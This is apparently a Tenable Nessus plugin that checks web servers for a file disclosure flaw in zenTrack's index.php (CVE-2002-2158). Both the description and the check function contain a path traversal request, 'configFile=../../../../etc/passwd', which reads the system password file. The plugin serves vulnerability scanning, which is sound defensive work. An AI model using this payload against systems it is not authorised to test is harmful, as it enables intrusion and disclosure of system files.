#
# This script is (C) Tenable Network Security
#
#
# Ref:
#
# Subject: Re: zenTrack Remote Command Execution Vulnerabilities
# From: gr00vy <groovy2600@yahoo.com.ar>
# To: bugtraq@list-id.securityfocus.com,
# Date: 06 Jun 2003 22:48:43 -0300


if(description)
{
 script_id(11708);
 script_cve_id("CVE-2002-2158");
 script_bugtraq_id(4973, 7843, 7844);
 script_version ("$Revision: 1.12 $");

 name["english"] = "zenTrack Files Reading";

 script_name(english:name["english"]);
 
 desc["english"] = "
Synopsis :

The remote web server contains a PHP script that is prone to file
disclosure attacks. 

Description :

It is possible to make the remote web server show the content
of arbitrary files by making requests like :

  index.php?configFile=../../../../../../../../../../etc/passwd

See also : 

http://www.securityfocus.com/archive/1/324264/2003-06-04/2003-06-10/0

Solution : 

Upgrade to zenTrack 2.4.2 or later.

Risk factor : 

Low / CVSS Base Score : 2.3
(AV:R/AC:L/Au:NR/C:P/I:N/A:N/B:N)";


 script_description(english:desc["english"]);
 
 summary["english"] = "Checks for the presence of zenTrack's index.php";
 
 script_summary(english:summary["english"]);
 
 script_category(ACT_ATTACK);
 
 
 script_copyright(english:"This script is Copyright (C) 2003 Tenable Network Security",
		francais:"Ce script est Copyright (C) 2003 Tenable Network Security");
 family["english"] = "CGI abuses";
 family["francais"] = "Abus de CGI";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

#
# The script code starts here
#


include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if(!get_port_state(port))exit(0);
if(!can_host_php(port:port))exit(0);



function check(loc)
{
 req = http_get(item:string(loc, "/index.php?configFile=../../../../../../../../../etc/passwd"), port:port);
 r = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
 if( r == NULL )exit(0);
 if(egrep(pattern:"root:.*:0:[01]:.*", string:r))
 {
 	security_note(port);
	exit(0);
 }
}


foreach dir ( cgi_dirs() )
{
 check(loc:dir);
}
